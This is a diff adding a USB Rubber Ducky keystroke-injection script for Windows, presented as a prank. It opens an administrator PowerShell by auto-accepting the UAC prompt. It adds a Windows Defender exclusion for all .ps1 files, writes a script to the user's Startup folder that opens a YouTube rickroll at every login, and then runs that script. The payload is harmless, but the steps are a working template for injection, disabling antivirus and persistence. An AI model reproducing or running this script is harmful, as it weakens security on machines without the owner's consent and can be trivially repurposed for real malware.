@@ -1,0 +1,72 @@
+REM
+REM Author:      katekyy (Discord: katekyy#7129)
+REM
+REM Description: This script allows you to create a rickroll script into
+REM Description: autostart directory of the current user.
+REM Description: Also it rickrolls you, kind of..
+REM
+REM Additional Desc.: (Not ASCII)
+REM
+REM Version:     1.0
+REM
+REM Os type:     Windows
+REM
+REM Category:    FUN/RICKROLL
+REM
+
+DELAY 2000
+GUI d
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell.exe
+DELAY 200
+CTRL SHIFT ENTER
+DELAY 5000
+LEFT
+DELAY 150
+ENTER
+DELAY 4000
+STRING cd C:\Users\Public\Documents
+ENTER
+STRING Add-MpPreference -ExclusionExtension ps1 -Force
+ENTER
+STRING cd C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+ENTER
+STRING echo Start-Process "https://youtu.be/cvh0nX08nRw&ab_channel=AlexeyKutepov" >> Rickroll.ps1
+ENTER
+
+DELAY 100
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+
+CTRL l
+STRING echo Testing in 5 [|]
+ENTER
+DELAY 1000
+CTRL l
+STRING echo Testing in 4 [/]
+ENTER
+DELAY 1000
+CTRL l
+STRING echo Testing in 3 [-]
+ENTER
+DELAY 1000
+CTRL l
+STRING echo Testing in 2 [\]
+ENTER
+DELAY 1000
+CTRL l
+STRING echo Testing in 1 [|]
+ENTER
+DELAY 1000
+CTRL l
+STRING echo Testing in 0 [/]
+ENTER
+DELAY 1000
+CTRL l
+
+STRING Get-Content .\Rickroll.ps1 | PowerShell.exe -noprofile -
+ENTER
